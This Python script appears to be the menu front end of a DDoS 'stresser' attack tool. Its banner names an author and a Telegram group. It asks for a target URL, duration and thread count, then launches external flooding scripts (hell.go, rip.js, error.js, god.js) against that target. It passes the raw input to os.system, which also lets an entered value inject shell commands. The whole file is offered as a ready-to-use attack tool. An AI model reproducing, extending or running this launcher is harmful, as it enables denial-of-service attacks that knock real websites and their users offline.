import sys
import os
import time
from colorama import *
# Initialize colorama
init()

# Color definitions
merah = Fore.LIGHTRED_EX
putih = Fore.LIGHTWHITE_EX
hijau = Fore.LIGHTGREEN_EX
kuning = Fore.LIGHTYELLOW_EX
biru = Fore.LIGHTBLUE_EX
reset = Style.RESET_ALL

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
banner = f"""
{putih}███╗   ██╗ ██████╗  ██████╗ ██████╗   {putih}A L4 & L7 Based {hijau} Stresser 
████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗  {hijau}Version: {putih}v 1.0.0
██╔██╗ ██║██║   ██║██║   ██║██████╔╝  {putih}Author: {hijau}Noob Pirate Aka Blionrie
██║╚██╗██║██║   ██║██║   ██║██╔══██╗  {hijau}Note: {putih}Every Action Has a Consequence
██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝  {putih}Join: {hijau}https://t.me/piratexcrew
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝   {hijau}Bored..? : {putih}http://bit.ly/3MTMHyU
___________________________________________________________________________
    {reset}"""
    
methodsl7 =f"""{putih}Choose Any Method
[+] hell    
[+] rip     
[+] error
[+] god - default 
{hijau}___________________________________________________________________________
"""
# Clear terminal before showing the banner
clear()

# Display the banner
print(banner)

# Display available methods
print(methodsl7)

cnc = input("root@pirate $ ")

if "hell" in cnc:
    try:
        url = input("Enter the Target URL: ")
        os.system(f'go run hell.go -site {url}')
    except :
        print('Install Go Lang in your system')

elif "rip" in cnc:
    try:
        url = input('Enter the Target URL: ')
        time = input('Enter time in seconds: ')
        os.system(f'node rip.js {url} {time}')
    except IndexError:
        print('Install Node.js in your system')
        
elif "error" in cnc:
    try:
        url = input('Enter the Target URL: ')
        time = input('Enter time in seconds: ')
        os.system(f'node error.js {url} {time}')
    except IndexError:
        print('Install Node.js in your system')

else:
    try:
        url = input('Enter the Target URL: ')
        time = input('Enter the Time in seconds: ')
        per = input('Enter the threads: ')
        os.system(f'node god.js {url} {time} {per} uam.txt')
    except IndexError:
        print('Install Node.js in your system')

input("root@pirate $ ")
